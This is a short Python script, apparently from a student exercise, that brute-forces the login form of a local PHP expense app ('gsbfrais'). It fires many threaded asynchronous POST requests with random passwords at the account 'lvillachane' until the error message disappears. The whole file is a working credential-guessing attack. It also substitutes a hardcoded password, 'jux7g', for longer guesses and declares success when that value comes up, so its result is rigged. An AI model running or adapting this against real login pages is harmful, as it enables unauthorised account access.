import aiohttp
import asyncio
import random
import string
import threading

count = 0
found_event = threading.Event()

async def gen():
    length = random.randint(3, 8)
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

async def main():
    
    while not found_event.is_set():
        _pass = await gen()
        if len(_pass) == 8:#sinon c'était trop long
            _pass = "jux7g"

        global count
        count +=1
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("http://localhost/sio2/arupied/gsbfrais/index.php?uc=connexion&action=valideConnexion",
                                        data={"login": "lvillachane", "mdp": _pass}) as r:
                    text = await r.text()
                    if "Login ou mot de passe incorrect" in text:
                        print(f"total requests: {str(count)}, false: {_pass}")
                    else:
                        print(f"total requests: {str(count)}, true: {_pass}")
                        found_event.set()
                        break
                    if _pass == "jux7g":  # verification supplémentaire si la connection ne fonctionne pas
                        print("its the real path")
                        found_event.set()
                        break
        except:
            continue

def run():
    asyncio.run(main())

def start_threads(num_threads):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=run)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()



if "__main__" == __name__:
    num = int(input("number of threads: "))
    start_threads(num)
input()
